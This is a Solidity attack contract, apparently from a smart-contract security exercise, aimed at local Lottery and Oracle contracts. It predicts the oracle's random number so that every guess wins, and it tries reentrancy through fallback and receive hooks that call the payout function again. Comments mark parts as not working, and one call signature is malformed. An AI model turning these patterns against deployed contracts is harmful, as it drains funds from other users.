// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.6.0;
pragma experimental ABIEncoderV2;

/// @title Lottery Game with interface to Oracle

import "./Lottery.sol";
import "./Oracle.sol";

contract Attack {

    Lottery public eg;
    Oracle public ek;
    address public winner;
    uint counter;

    constructor(address _oracle, address _lottery) public {
        eg = Lottery(payable(_lottery));
        ek = Oracle(_oracle);
    }

    function registerLottery(address _address) public payable {
        require(msg.value == 1_000_000_000);
        winner = _address;
        eg.registerTeam.value(msg.value)(_address, "Attack Contract", "");
    }

    //Makes the correct guess every time, gets 2 gwei payout
    function standardPayout() public {
        eg.makeAGuess(winner, ek.getRandomNumber());
        eg.payoutWinningTeam(winner);
    }

    // Does not work
    function reentrancyAttack() public view {
        if (gasleft() > 40_000){
            //eg.payoutWinningTeam(getAddress());
        }
    }

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
        addr := mload(add(bys,20))
        } 
    }

    function getAddress() public returns (bytes memory) {
        (, bytes memory temp) = address(eg).call(abi.encodeWithSignature
        ("payoutWinningTeam(address _team)", winner));
        return temp;
    }

    //called when call data is incorrect, when no function matches function in the bytes provided
    fallback() external payable {
        if(gasleft() > 40_000) {
            eg.payoutWinningTeam(winner);
        }
    }

    //called when empty call data is provided, which Lottery does
    receive() external payable {
        if(gasleft() > 40_000) {
            eg.payoutWinningTeam(winner);
        }
    }
}